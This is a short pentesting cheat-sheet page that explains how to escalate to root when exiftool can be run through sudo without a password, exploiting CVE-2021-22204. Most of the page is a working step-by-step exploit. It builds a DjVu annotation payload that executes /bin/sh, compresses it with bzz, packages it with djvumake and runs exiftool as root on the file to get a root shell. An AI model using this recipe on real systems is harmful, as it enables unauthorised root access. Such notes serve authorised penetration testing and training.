---
title: Sudo Exiftool Privilege Escalation
description: Sudo exiftool command might be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-02-05
draft: false
---

## Investigation

```sh
(root) NOPASSWD: /usr/local/bin/exiftool
```

If we can execute **"exiftool"** command as root, we can gain access to privileges.

<br />

## Arbitrary Code Execution (CVE-2021-22204) version 7.44+

Reference: [https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/](https://vk9-sec.com/exiftool-12-23-arbitrary-code-execution-privilege-escalation-cve-2021-22204/)


Check the exiftool version.  
If the exiftool version is later than **7.44**, we can execute arbitrary code.

```bash
exiftool -ver
```

### Exploitation

In local machine, create the payload in a file named **“exploit”**.

```bash
(metadata "\c${system('/bin/sh')};")
```

Next, compress the file.

```bash
bzz exploit exploit.bzz
```

Then create the DjVu file using the compressed file.

```bash
sudo apt install -y djvulibre-bin
# INFO: Create the initial information chunk.
# BGjp: Create a JPEG background chunk.
# ANTz: Write the compressed annotation chunk with the input file.
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=exploit.bzz
```

Now we have **“exploit.djvu”** file.   
Trasfer the file to the target machine and run exiftool as root given the DjVufile.

```bash
sudo /usr/local/bin/exiftool exploit.djvu
```

We should get a root shell.